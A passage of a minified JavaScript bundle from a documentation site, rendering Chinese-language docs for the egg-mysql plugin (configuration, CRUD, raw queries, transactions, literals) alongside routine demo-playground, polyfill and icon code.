     database: 'test',\n    },\n    db2: {\n      // host\n      host: 'mysql2.com',\n      // \u7aef\u53e3\u53f7\n      port: '3307',\n      // \u7528\u6237\u540d\n      user: 'test_user',\n      // \u5bc6\u7801\n      password: 'test_password',\n      // \u6570\u636e\u5e93\u540d\n      database: 'test',\n    },\n    // ...\n  },\n  // \u6240\u6709\u6570\u636e\u5e93\u914d\u7f6e\u7684\u9ed8\u8ba4\u503c\n  default: {},\n\n  // \u662f\u5426\u52a0\u8f7d\u5230 app \u4e0a\uff0c\u9ed8\u8ba4\u5f00\u542f\n  app: true,\n  // \u662f\u5426\u52a0\u8f7d\u5230 agent \u4e0a\uff0c\u9ed8\u8ba4\u5173\u95ed\n  agent: false,\n};",lang:"js"}),r.a.createElement("p",null,"\u4f7f\u7528\u65b9\u5f0f\uff1a"),r.a.createElement(o["a"],{code:"const client1 = app.mysql.get('db1');\nawait client1.query(sql, values);\n\nconst client2 = app.mysql.get('db2');\nawait client2.query(sql, values);",lang:"js"}),r.a.createElement("h4",{id:"\u52a8\u6001\u521b\u5efa"},r.a.createElement(l["AnchorLink"],{to:"#\u52a8\u6001\u521b\u5efa","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u52a8\u6001\u521b\u5efa"),r.a.createElement("p",null,"\u6211\u4eec\u53ef\u4ee5\u4e0d\u9700\u8981\u5c06\u914d\u7f6e\u63d0\u524d\u7533\u660e\u5728\u914d\u7f6e\u6587\u4ef6\u4e2d\uff0c\u800c\u662f\u5728\u5e94\u7528\u8fd0\u884c\u65f6\u52a8\u6001\u7684\u4ece\u914d\u7f6e\u4e2d\u5fc3\u83b7\u53d6\u5b9e\u9645\u7684\u53c2\u6570\uff0c\u518d\u6765\u521d\u59cb\u5316\u4e00\u4e2a\u5b9e\u4f8b\u3002"),r.a.createElement(o["a"],{code:"// {app_root}/app.js\nmodule.exports = (app) => {\n  app.beforeStart(async () => {\n    // \u4ece\u914d\u7f6e\u4e2d\u5fc3\u83b7\u53d6 MySQL \u7684\u914d\u7f6e\n    // { host: 'mysql.com', port: '3306', user: 'test_user', password: 'test_password', database: 'test' }\n    const mysqlConfig = await app.configCenter.fetch('mysql');\n    app.database = app.mysql.createInstance(mysqlConfig);\n  });\n};",lang:"js"}),r.a.createElement("h2",{id:"service-\u5c42"},r.a.createElement(l["AnchorLink"],{to:"#service-\u5c42","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Service \u5c42"),r.a.createElement("p",null,"\u7531\u4e8e\u5bf9 MySQL \u6570\u636e\u5e93\u7684\u8bbf\u95ee\u64cd\u4f5c\u5c5e\u4e8e Web \u5c42\u4e2d\u7684\u6570\u636e\u5904\u7406\u5c42\uff0c\u56e0\u6b64\u6211\u4eec\u5f3a\u70c8\u5efa\u8bae\u5c06\u8fd9\u90e8\u5206\u4ee3\u7801\u653e\u5728 Service \u5c42\u4e2d\u7ef4\u62a4\u3002"),r.a.createElement("p",null,"\u4e0b\u9762\u662f\u4e00\u4e2a Service \u4e2d\u8bbf\u95ee MySQL \u6570\u636e\u5e93\u7684\u4f8b\u5b50\u3002"),r.a.createElement("p",null,"\u66f4\u591a Service \u5c42\u7684\u4ecb\u7ecd\uff0c\u53ef\u4ee5\u53c2\u8003 ",r.a.createElement(l["Link"],{to:"../basics/service"},"Service")),r.a.createElement(o["a"],{code:"// app/service/user.js\nclass UserService extends Service {\n  async find(uid) {\n    // \u5047\u5982 \u6211\u4eec\u62ff\u5230\u7528\u6237 id \u4ece\u6570\u636e\u5e93\u83b7\u53d6\u7528\u6237\u8be6\u7ec6\u4fe1\u606f\n    const user = await this.app.mysql.get('users', { id: 11 });\n    return { user };\n  }\n}",lang:"js"}),r.a.createElement("p",null,"\u4e4b\u540e\u53ef\u4ee5\u901a\u8fc7 Controller \u83b7\u53d6 Service \u5c42\u62ff\u5230\u7684\u6570\u636e\u3002"),r.a.createElement(o["a"],{code:"// app/controller/user.js\nclass UserController extends Controller {\n  async info() {\n    const ctx = this.ctx;\n    const userId = ctx.params.id;\n    const user = await ctx.service.user.find(userId);\n    ctx.body = user;\n  }\n}",lang:"js"}),r.a.createElement("h2",{id:"\u5982\u4f55\u7f16\u5199-crud-\u8bed\u53e5"},r.a.createElement(l["AnchorLink"],{to:"#\u5982\u4f55\u7f16\u5199-crud-\u8bed\u53e5","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5982\u4f55\u7f16\u5199 CRUD \u8bed\u53e5"),r.a.createElement("p",null,"\u4e0b\u9762\u7684\u8bed\u53e5\u82e5\u6ca1\u6709\u7279\u6b8a\u6ce8\u660e\uff0c\u9ed8\u8ba4\u90fd\u4e66\u5199\u5728 ",r.a.createElement("code",null,"app/service")," \u4e0b\u3002"),r.a.createElement("h3",{id:"create"},r.a.createElement(l["AnchorLink"],{to:"#create","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Create"),r.a.createElement("p",null,"\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 ",r.a.createElement("code",null,"insert")," \u65b9\u6cd5\u63d2\u5165\u4e00\u6761\u8bb0\u5f55\u3002"),r.a.createElement(o["a"],{code:"// \u63d2\u5165\nconst result = await this.app.mysql.insert('posts', { title: 'Hello World' }); // \u5728 post \u8868\u4e2d\uff0c\u63d2\u5165 title \u4e3a Hello World \u7684\u8bb0\u5f55\n\n=> INSERT INTO `posts`(`title`) VALUES('Hello World');\n\nconsole.log(result);\n=>\n{\n  fieldCount: 0,\n  affectedRows: 1,\n  insertId: 3710,\n  serverStatus: 2,\n  warningCount: 2,\n  message: '',\n  protocol41: true,\n  changedRows: 0\n}\n\n// \u5224\u65ad\u63d2\u5165\u6210\u529f\nconst insertSuccess = result.affectedRows === 1;",lang:"js"}),r.a.createElement("h3",{id:"read"},r.a.createElement(l["AnchorLink"],{to:"#read","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Read"),r.a.createElement("p",null,"\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 ",r.a.createElement("code",null,"get")," \u65b9\u6cd5\u6216 ",r.a.createElement("code",null,"select")," \u65b9\u6cd5\u83b7\u53d6\u4e00\u6761\u6216\u591a\u6761\u8bb0\u5f55\u3002",r.a.createElement("code",null,"select")," \u65b9\u6cd5\u652f\u6301\u6761\u4ef6\u67e5\u8be2\u4e0e\u7ed3\u679c\u7684\u5b9a\u5236\u3002"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u67e5\u8be2\u4e00\u6761\u8bb0\u5f55")),r.a.createElement(o["a"],{code:"const post = await this.app.mysql.get('posts', { id: 12 });\n\n=> SELECT * FROM `posts` WHERE `id` = 12 LIMIT 0, 1;",lang:"js"}),r.a.createElement("ul",null,r.a.createElement("li",null,"\u67e5\u8be2\u5168\u8868")),r.a.createElement(o["a"],{code:"const results = await this.app.mysql.select('posts');\n\n=> SELECT * FROM `posts`;",lang:"js"}),r.a.createElement("ul",null,r.a.createElement("li",null,"\u6761\u4ef6\u67e5\u8be2\u548c\u7ed3\u679c\u5b9a\u5236")),r.a.createElement(o["a"],{code:"const results = await this.app.mysql.select('posts', { // \u641c\u7d22 post \u8868\n  where: { status: 'draft', author: ['author1', 'author2'] }, // WHERE \u6761\u4ef6\n  columns: ['author', 'title'], // \u8981\u67e5\u8be2\u7684\u8868\u5b57\u6bb5\n  orders: [['created_at','desc'], ['id','desc']], // \u6392\u5e8f\u65b9\u5f0f\n  limit: 10, // \u8fd4\u56de\u6570\u636e\u91cf\n  offset: 0, // \u6570\u636e\u504f\u79fb\u91cf\n});\n\n=> SELECT `author`, `title` FROM `posts`\n  WHERE `status` = 'draft' AND `author` IN('author1','author2')\n  ORDER BY `created_at` DESC, `id` DESC LIMIT 0, 10;",lang:"js"}),r.a.createElement("h3",{id:"update"},r.a.createElement(l["AnchorLink"],{to:"#update","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Update"),r.a.createElement("p",null,"\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 ",r.a.createElement("code",null,"update")," \u65b9\u6cd5\u66f4\u65b0\u6570\u636e\u5e93\u8bb0\u5f55\u3002"),r.a.createElement(o["a"],{code:"// \u4fee\u6539\u6570\u636e\uff0c\u5c06\u4f1a\u6839\u636e\u4e3b\u952e ID \u67e5\u627e\uff0c\u5e76\u66f4\u65b0\nconst row = {\n  id: 123,\n  name: 'fengmk2',\n  otherField: 'other field value',    // any other fields u want to update\n  modifiedAt: this.app.mysql.literals.now, // `now()` on db server\n};\nconst result = await this.app.mysql.update('posts', row); // \u66f4\u65b0 posts \u8868\u4e2d\u7684\u8bb0\u5f55\n\n=> UPDATE `posts` SET `name` = 'fengmk2', `modifiedAt` = NOW() WHERE id = 123 ;\n\n// \u5224\u65ad\u66f4\u65b0\u6210\u529f\nconst updateSuccess = result.affectedRows === 1;\n\n// \u5982\u679c\u4e3b\u952e\u662f\u81ea\u5b9a\u4e49\u7684 ID \u540d\u79f0\uff0c\u5982 custom_id\uff0c\u5219\u9700\u8981\u5728 `where` \u91cc\u9762\u914d\u7f6e\nconst row = {\n  name: 'fengmk2',\n  otherField: 'other field value',    // any other fields u want to update\n  modifiedAt: this.app.mysql.literals.now, // `now()` on db server\n};\n\nconst options = {\n  where: {\n    custom_id: 456\n  }\n};\nconst result = await this.app.mysql.update('posts', row, options); // \u66f4\u65b0 posts \u8868\u4e2d\u7684\u8bb0\u5f55\n\n=> UPDATE `posts` SET `name` = 'fengmk2', `modifiedAt` = NOW() WHERE custom_id = 456 ;\n\n// \u5224\u65ad\u66f4\u65b0\u6210\u529f\nconst updateSuccess = result.affectedRows === 1;",lang:"js"}),r.a.createElement("h3",{id:"delete"},r.a.createElement(l["AnchorLink"],{to:"#delete","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Delete"),r.a.createElement("p",null,"\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 ",r.a.createElement("code",null,"delete")," \u65b9\u6cd5\u5220\u9664\u6570\u636e\u5e93\u8bb0\u5f55\u3002"),r.a.createElement(o["a"],{code:"const result = await this.app.mysql.delete('posts', {\n  author: 'fengmk2',\n});\n\n=> DELETE FROM `posts` WHERE `author` = 'fengmk2';",lang:"js"}),r.a.createElement("h2",{id:"\u76f4\u63a5\u6267\u884c-sql-\u8bed\u53e5"},r.a.createElement(l["AnchorLink"],{to:"#\u76f4\u63a5\u6267\u884c-sql-\u8bed\u53e5","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u76f4\u63a5\u6267\u884c sql \u8bed\u53e5"),r.a.createElement("p",null,"\u63d2\u4ef6\u672c\u8eab\u4e5f\u652f\u6301\u62fc\u63a5\u4e0e\u76f4\u63a5\u6267\u884c sql \u8bed\u53e5\u3002\u4f7f\u7528 ",r.a.createElement("code",null,"query")," \u53ef\u4ee5\u6267\u884c\u5408\u6cd5\u7684 sql \u8bed\u53e5\u3002"),r.a.createElement("p",null,r.a.createElement("strong",null,"\u6ce8\u610f\uff01\uff01\u6211\u4eec\u6781\u5176\u4e0d\u5efa\u8bae\u5f00\u53d1\u8005\u62fc\u63a5 sql \u8bed\u53e5\uff0c\u8fd9\u6837\u5f88\u5bb9\u6613\u5f15\u8d77 sql \u6ce8\u5165\uff01\uff01")),r.a.createElement("p",null,"\u5982\u679c\u5fc5\u987b\u8981\u81ea\u5df1\u62fc\u63a5 sql \u8bed\u53e5\uff0c\u8bf7\u4f7f\u7528 ",r.a.createElement("code",null,"mysql.escape")," \u65b9\u6cd5\u3002"),r.a.createElement("p",null,"\u53c2\u8003 ",r.a.createElement(l["Link"],{to:"http://stackoverflow.com/questions/15778572/preventing-sql-injection-in-node-js"},"preventing-sql-injection-in-node-js")),r.a.createElement(o["a"],{code:"const postId = 1;\nconst results = await this.app.mysql.query('update posts set hits = (hits + ?) where id = ?', [1, postId]);\n\n=> update posts set hits = (hits + 1) where id = 1;",lang:"js"}),r.a.createElement("h2",{id:"\u4f7f\u7528\u4e8b\u52a1"},r.a.createElement(l["AnchorLink"],{to:"#\u4f7f\u7528\u4e8b\u52a1","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u4f7f\u7528\u4e8b\u52a1"),r.a.createElement("p",null,"MySQL \u4e8b\u52a1\u4e3b\u8981\u7528\u4e8e\u5904\u7406\u64cd\u4f5c\u91cf\u5927\uff0c\u590d\u6742\u5ea6\u9ad8\u7684\u6570\u636e\u3002\u6bd4\u5982\u8bf4\uff0c\u5728\u4eba\u5458\u7ba1\u7406\u7cfb\u7edf\u4e2d\uff0c\u4f60\u5220\u9664\u4e00\u4e2a\u4eba\u5458\uff0c\u4f60\u65e2\u9700\u8981\u5220\u9664\u4eba\u5458\u7684\u57fa\u672c\u8d44\u6599\uff0c\u4e5f\u8981\u5220\u9664\u548c\u8be5\u4eba\u5458\u76f8\u5173\u7684\u4fe1\u606f\uff0c\u5982\u4fe1\u7bb1\uff0c\u6587\u7ae0\u7b49\u7b49\u3002\u8fd9\u65f6\u5019\u4f7f\u7528\u4e8b\u52a1\u5904\u7406\u53ef\u4ee5\u65b9\u4fbf\u7ba1\u7406\u8fd9\u4e00\u7ec4\u64cd\u4f5c\u3002 \u4e00\u4e2a\u4e8b\u52a1\u5c06\u4e00\u7ec4\u8fde\u7eed\u7684\u6570\u636e\u5e93\u64cd\u4f5c\uff0c\u653e\u5728\u4e00\u4e2a\u5355\u4e00\u7684\u5de5\u4f5c\u5355\u5143\u6765\u6267\u884c\u3002\u8be5\u7ec4\u5185\u7684\u6bcf\u4e2a\u5355\u72ec\u7684\u64cd\u4f5c\u662f\u6210\u529f\uff0c\u4e8b\u52a1\u624d\u80fd\u6210\u529f\u3002\u5982\u679c\u4e8b\u52a1\u4e2d\u7684\u4efb\u4f55\u64cd\u4f5c\u5931\u8d25\uff0c\u5219\u6574\u4e2a\u4e8b\u52a1\u5c06\u5931\u8d25\u3002"),r.a.createElement("p",null,"\u4e00\u822c\u6765\u8bf4\uff0c\u4e8b\u52a1\u662f\u5fc5\u987b\u6ee1\u8db3 4 \u4e2a\u6761\u4ef6\uff08ACID\uff09\uff1a Atomicity\uff08\u539f\u5b50\u6027\uff09\u3001Consistency\uff08\u4e00\u81f4\u6027\uff09\u3001Isolation\uff08\u9694\u79bb\u6027\uff09\u3001Durability\uff08\u53ef\u9760\u6027\uff09"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u539f\u5b50\u6027\uff1a\u786e\u4fdd\u4e8b\u52a1\u5185\u7684\u6240\u6709\u64cd\u4f5c\u90fd\u6210\u529f\u5b8c\u6210\uff0c\u5426\u5219\u4e8b\u52a1\u5c06\u88ab\u4e2d\u6b62\u5728\u6545\u969c\u70b9\uff0c\u4ee5\u524d\u7684\u64cd\u4f5c\u5c06\u56de\u6eda\u5230\u4ee5\u524d\u7684\u72b6\u6001\u3002"),r.a.createElement("li",null,"\u4e00\u81f4\u6027\uff1a\u5bf9\u4e8e\u6570\u636e\u5e93\u7684\u4fee\u6539\u662f\u4e00\u81f4\u7684\u3002"),r.a.createElement("li",null,"\u9694\u79bb\u6027\uff1a\u4e8b\u52a1\u662f\u5f7c\u6b64\u72ec\u7acb\u7684\uff0c\u4e0d\u4e92\u76f8\u5f71\u54cd"),r.a.createElement("li",null,"\u6301\u4e45\u6027\uff1a\u786e\u4fdd\u63d0\u4ea4\u4e8b\u52a1\u540e\uff0c\u4e8b\u52a1\u4ea7\u751f\u7684\u7ed3\u679c\u53ef\u4ee5\u6c38\u4e45\u5b58\u5728\u3002")),r.a.createElement("p",null,"\u56e0\u6b64\uff0c\u5bf9\u4e8e\u4e00\u4e2a\u4e8b\u52a1\u6765\u8bb2\uff0c\u4e00\u5b9a\u4f34\u968f\u7740 beginTransaction\u3001commit \u6216 rollback\uff0c\u5206\u522b\u4ee3\u8868\u4e8b\u52a1\u7684\u5f00\u59cb\uff0c\u6210\u529f\u548c\u5931\u8d25\u56de\u6eda\u3002"),r.a.createElement("p",null,"egg-mysql \u63d0\u4f9b\u4e86\u4e24\u79cd\u7c7b\u578b\u7684\u4e8b\u52a1\u3002"),r.a.createElement("h3",{id:"\u624b\u52a8\u63a7\u5236"},r.a.createElement(l["AnchorLink"],{to:"#\u624b\u52a8\u63a7\u5236","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u624b\u52a8\u63a7\u5236"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u4f18\u70b9\uff1a",r.a.createElement("code",null,"beginTransaction"),", ",r.a.createElement("code",null,"commit")," \u6216 ",r.a.createElement("code",null,"rollback")," \u90fd\u7531\u5f00\u53d1\u8005\u6765\u5b8c\u5168\u63a7\u5236\uff0c\u53ef\u4ee5\u505a\u5230\u975e\u5e38\u7ec6\u7c92\u5ea6\u7684\u63a7\u5236\u3002"),r.a.createElement("li",null,"\u7f3a\u70b9\uff1a\u624b\u5199\u4ee3\u7801\u6bd4\u8f83\u591a\uff0c\u4e0d\u662f\u6bcf\u4e2a\u4eba\u90fd\u80fd\u5199\u597d\u3002\u5fd8\u8bb0\u4e86\u6355\u83b7\u5f02\u5e38\u548c cleanup \u90fd\u4f1a\u5bfc\u81f4\u4e25\u91cd bug\u3002")),r.a.createElement(o["a"],{code:"const conn = await app.mysql.beginTransaction(); // \u521d\u59cb\u5316\u4e8b\u52a1\n\ntry {\n  await conn.insert(table, row1); // \u7b2c\u4e00\u6b65\u64cd\u4f5c\n  await conn.update(table, row2); // \u7b2c\u4e8c\u6b65\u64cd\u4f5c\n  await conn.commit(); // \u63d0\u4ea4\u4e8b\u52a1\n} catch (err) {\n  // error, rollback\n  await conn.rollback(); // \u4e00\u5b9a\u8bb0\u5f97\u6355\u83b7\u5f02\u5e38\u540e\u56de\u6eda\u4e8b\u52a1\uff01\uff01\n  throw err;\n}",lang:"js"}),r.a.createElement("h3",{id:"\u81ea\u52a8\u63a7\u5236transaction-with-scope"},r.a.createElement(l["AnchorLink"],{to:"#\u81ea\u52a8\u63a7\u5236transaction-with-scope","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u81ea\u52a8\u63a7\u5236\uff1aTransaction with scope"),r.a.createElement("ul",null,r.a.createElement("li",null,"API\uff1a",r.a.createElement("code",null,"beginTransactionScope(scope, ctx)"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"scope"),": \u4e00\u4e2a generatorFunction\uff0c\u5728\u8fd9\u4e2a\u51fd\u6570\u91cc\u9762\u6267\u884c\u8fd9\u6b21\u4e8b\u52a1\u7684\u6240\u6709 sql \u8bed\u53e5\u3002"),r.a.createElement("li",null,r.a.createElement("code",null,"ctx"),": \u5f53\u524d\u8bf7\u6c42\u7684\u4e0a\u4e0b\u6587\u5bf9\u8c61\uff0c\u4f20\u5165 ctx \u53ef\u4ee5\u4fdd\u8bc1\u5373\u4fbf\u5728\u51fa\u73b0\u4e8b\u52a1\u5d4c\u5957\u7684\u60c5\u51b5\u4e0b\uff0c\u4e00\u6b21\u8bf7\u6c42\u4e2d\u540c\u65f6\u53ea\u6709\u4e00\u4e2a\u6fc0\u6d3b\u72b6\u6001\u7684\u4e8b\u52a1\u3002"))),r.a.createElement("li",null,"\u4f18\u70b9\uff1a\u4f7f\u7528\u7b80\u5355\uff0c\u4e0d\u5bb9\u6613\u72af\u9519\uff0c\u5c31\u611f\u89c9\u4e8b\u52a1\u4e0d\u5b58\u5728\u7684\u6837\u5b50\u3002"),r.a.createElement("li",null,"\u7f3a\u70b9\uff1a\u6574\u4e2a\u4e8b\u52a1\u8981\u4e48\u6210\u529f\uff0c\u8981\u4e48\u5931\u8d25\uff0c\u65e0\u6cd5\u505a\u7ec6\u7c92\u5ea6\u63a7\u5236\u3002")),r.a.createElement(o["a"],{code:"const result = await app.mysql.beginTransactionScope(async (conn) => {\n  // don't commit or rollback by yourself\n  await conn.insert(table, row1);\n  await conn.update(table, row2);\n  return { success: true };\n}, ctx); // ctx \u662f\u5f53\u524d\u8bf7\u6c42\u7684\u4e0a\u4e0b\u6587\uff0c\u5982\u679c\u662f\u5728 service \u6587\u4ef6\u4e2d\uff0c\u53ef\u4ee5\u4ece `this.ctx` \u83b7\u53d6\u5230\n// if error throw on scope, will auto rollback",lang:"js"}),r.a.createElement("h2",{id:"\u8868\u8fbe\u5f0fliteral"},r.a.createElement(l["AnchorLink"],{to:"#\u8868\u8fbe\u5f0fliteral","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u8868\u8fbe\u5f0f(Literal)"),r.a.createElement("p",null,"\u5982\u679c\u9700\u8981\u8c03\u7528 MySQL \u5185\u7f6e\u7684\u51fd\u6570\uff08\u6216\u8868\u8fbe\u5f0f\uff09\uff0c\u53ef\u4ee5\u4f7f\u7528 ",r.a.createElement("code",null,"Literal"),"\u3002"),r.a.createElement("h3",{id:"\u5185\u7f6e\u8868\u8fbe\u5f0f"},r.a.createElement(l["AnchorLink"],{to:"#\u5185\u7f6e\u8868\u8fbe\u5f0f","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5185\u7f6e\u8868\u8fbe\u5f0f"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"NOW()"),"\uff1a\u6570\u636e\u5e93\u5f53\u524d\u7cfb\u7edf\u65f6\u95f4\uff0c\u901a\u8fc7 ",r.a.createElement("code",null,"app.mysql.literals.now")," \u83b7\u53d6\u3002")),r.a.createElement(o["a"],{code:"await this.app.mysql.insert(table, {\n  create_time: this.app.mysql.literals.now,\n});\n\n=> INSERT INTO `$table`(`create_time`) VALUES(NOW())",lang:"js"}),r.a.createElement("h3",{id:"\u81ea\u5b9a\u4e49\u8868\u8fbe\u5f0f"},r.a.createElement(l["AnchorLink"],{to:"#\u81ea\u5b9a\u4e49\u8868\u8fbe\u5f0f","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u81ea\u5b9a\u4e49\u8868\u8fbe\u5f0f"),r.a.createElement("p",null,"\u4e0b\u4f8b\u5c55\u793a\u4e86\u5982\u4f55\u8c03\u7528 MySQL \u5185\u7f6e\u7684 ",r.a.createElement("code",null,"CONCAT(s1, ...sn)")," \u51fd\u6570\uff0c\u505a\u5b57\u7b26\u4e32\u62fc\u63a5\u3002"),r.a.createElement(o["a"],{code:'const Literal = this.app.mysql.literals.Literal;\nconst first = \'James\';\nconst last = \'Bond\';\nawait this.app.mysql.insert(table, {\n  id: 123,\n  fullname: new Literal(`CONCAT("${first}", "${last}"`),\n});\n\n=> INSERT INTO `$table`(`id`, `fullname`) VALUES(123, CONCAT("James", "Bond"))',lang:"js"})))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(i,{demos:n})}},y2L3:function(e,t,n){"use strict";var a=n("/Edg")["default"],r=n("/kpV")["default"];function l(){var e=n("FU0I");return l=function(){return e},e}function o(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);t&&(a=a.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,a)}return n}function i(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?o(Object(n),!0).forEach((function(t){c(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):o(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function c(e,t,n){return t=s(t),t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function s(e){var t=u(e,"string");return"symbol"===typeof t?t:String(t)}function u(e,t){if("object"!==typeof e||null===e)return e;var n=e[Symbol.toPrimitive];if(void 0!==n){var a=n.call(e,t||"default");if("object"!==typeof a)return a;throw new TypeError("@@toPrimitive must return a primitive value.")}return("string"===t?String:Number)(e)}function d(e,t){return f(e)||g(e,t)||p(e,t)||m()}function m(){throw new TypeError("Invalid attempt to destructure non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}function p(e,t){if(e){if("string"===typeof e)return h(e,t);var n=Object.prototype.toString.call(e).slice(8,-1);return"Object"===n&&e.constructor&&(n=e.constructor.name),"Map"===n||"Set"===n?Array.from(e):"Arguments"===n||/^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n)?h(e,t):void 0}}function h(e,t){(null==t||t>e.length)&&(t=e.length);for(var n=0,a=new Array(t);n<t;n++)a[n]=e[n];return a}function g(e,t){var n=null==e?null:"undefined"!=typeof Symbol&&e[Symbol.iterator]||e["@@iterator"];if(null!=n){var a,r,l,o,i=[],c=!0,s=!1;try{if(l=(n=n.call(e)).next,0===t){if(Object(n)!==n)return;c=!1}else for(;!(c=(a=l.call(n)).done)&&(i.push(a.value),i.length!==t);c=!0);}catch(u){s=!0,r=u}finally{try{if(!c&&null!=n["return"]&&(o=n["return"](),Object(o)!==o))return}finally{if(s)throw r}}return i}}function f(e){if(Array.isArray(e))return e}Object.defineProperty(t,"__esModule",{value:!0}),t["default"]=void 0;var E,b="https://riddle.alibaba-inc.com/riddles/define",v=function(){var e=(0,l().useState)(Boolean(E)),t=d(e,2),n=t[0],a=t[1];return(0,l().useEffect)((function(){if(void 0===E){var e=document.createElement("img");setTimeout((function(){e.src="",e.remove()}),200),e.onload=function(){E=!0,a(!0),e.remove()},e.src="https://private-alipayobjects.alipay.com/alipay-rmsdeploy-image/rmsportal/RKuAiriJqrUhyqW.png"}}),[]),n};function y(e){var t=e.sources._.tsx||e.sources._.jsx;return t=t.replace(/^/,"import ReactDOM from 'react-dom';\n").replace("export default","const DumiDemo =").concat("\nReactDOM.render(<DumiDemo />, mountNode);"),t}var k=function(e){var t=(0,l().useState)(),n=d(t,2),o=n[0],c=n[1],s=v();return(0,l().useEffect)((function(){if(e&&s&&1===Object.keys(e.sources).length){var t,n=document.createElement("form"),l=document.createElement("input");return n.method="POST",n.target="_blank",n.style.display="none",n.action=b,n.appendChild(l),n.setAttribute("data-demo",e.title||""),l.name="data",l.value=JSON.stringify({title:e.titlle,js:y(e),css:Object.entries(e.dependencies).filter((function(e){var t=r(e,2),n=t[1];return n.css})).map((function(e){var t=r(e,2),n=t[0],a=t[1],l=a.version,o=a.css;return"@import '~".concat(o.replace(new RegExp("^(".concat(n,")")),"$1@".concat(l)),"';")})).concat(e.background?"body {\n  background: ".concat(e.background,";\n}"):"").join("\n"),json:JSON.stringify({description:e.description,dependencies:Object.entries(e.dependencies).reduce((function(e,t){var n=r(t,2),l=n[0],o=n[1].version;return i(i({},e),{},a({},l,o))}),{"react-dom":(null===(t=e.dependencies.react)||void 0===t?void 0:t.version)||"latest"})},null,2)}),document.body.appendChild(n),c((function(){return function(){return n.submit()}})),function(){return n.remove()}}}),[e,s]),o};t["default"]=k},y64K:function(e,t,n){var a=n("WM7W");a("split")},y8bx:function(e,t,n){var a=n("AaXQ");e.exports=function(e){if("number"!=typeof e&&"Number"!=a(e))throw TypeError("Incorrect invocation");return+e}},yKrg:function(e,t,n){var a=n("WM7W");a("asyncIterator")},yZ1w:function(e,t,n){"use strict";var a=n("0mt+"),r=n("m4/z"),l=n("oyD1"),o=n("G9w8"),i=n("BZjo"),c=n("NBU9");a({target:"Set",proto:!0,real:!0,forced:r},{some:function(e){var t=l(this),n=i(t),a=o(e,arguments.length>1?arguments[1]:void 0,3);return c(n,(function(e){if(a(e,e,t))return c.stop()}),void 0,!1,!0).stopped}})},ygTs:function(e,t,n){"use strict";var a=n("3Qq0"),r=n("FU0I"),l={icon:{tag:"svg",attrs:{viewBox:"64 64 896 896",focusable:"false"},children:[{tag:"path",attrs:{d:"M512 64C264.6 64 64 264.6 64 512s200.6 448 448 448 448-200.6 448-448S759.4 64 512 64zm165.4 618.2l-66-.3L512 563.4l-99.3 118.4-66.1.3c-4.4 0-8-3.5-8-8 0-1.9.7-3.7 1.9-5.2l130.1-155L340.5 359a8.32 8.32 0 01-1.9-5.2c0-4.4 3.6-8 8-8l66.1.3L512 464.6l99.3-118.4 66-.3c4.4 0 8 3.5 8 8 0 1.9-.7 3.7-1.9 5.2L553.5 514l130 155c1.2 1.5 1.9 3.3 1.9 5.2 0 4.4-3.6 8-8 8z"}}]},name:"close-circle",theme:"filled"},o=l,i=n("Il1s"),c=function(e,t){return r["createElement"](i["a"],Object(a["a"])(Object(a["a"])({},e),{},{ref:t,icon:o}))};c.displayName="CloseCircleFilled";t["a"]=r["forwardRef"](c)},ylap:function(e,t,n){"use strict";n.d(t,"a",(function(){return h}));var a=n("2EJr"),r=n("qPib"),l=n("E3E7"),o=n("+g4N"),i=n("zraO"),c=n("+ujd"),s=n("FU0I"),u=n("kqhb"),d=n.n(u),m=n("VGn1"),p=n.n(m),h=function(e){Object(i["a"])(n,e);var t=Object(c["a"])(n);function n(){var e;Object(l["a"])(this,n);for(var a=arguments.length,r=new Array(a),o=0;o<a;o++)r[o]=arguments[o];return e=t.call.apply(t,[this].concat(r)),e.closeTimer=null,e.close=function(t){t&&t.stopPropagation(),e.clearCloseTimer();var 